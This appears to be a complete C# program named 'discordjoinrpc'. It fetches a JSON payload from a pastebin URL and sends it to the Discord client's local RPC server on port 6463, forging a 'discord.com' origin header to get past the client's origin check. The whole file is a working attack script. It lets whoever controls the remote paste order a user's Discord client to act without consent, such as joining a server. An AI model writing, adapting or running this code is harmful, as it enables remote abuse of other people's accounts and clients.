using System.Net;
using System.Text;

namespace discordjoinrpc
{
    class Program
    {
        static void Main(string[] args)
        {
            using (WebClient wc = new WebClient())
            {
                byte[] b = new ASCIIEncoding().GetBytes(wc.DownloadString("https://pastebin.com/raw/HewMXTdA"));
                wc.Headers.Add(HttpRequestHeader.ContentType, "application/json");
                wc.Headers.Add("origin", "https://discord.com");
                wc.UploadData("http://127.0.0.1:6463/rpc?v=1", b);
            }
        }
    }
}
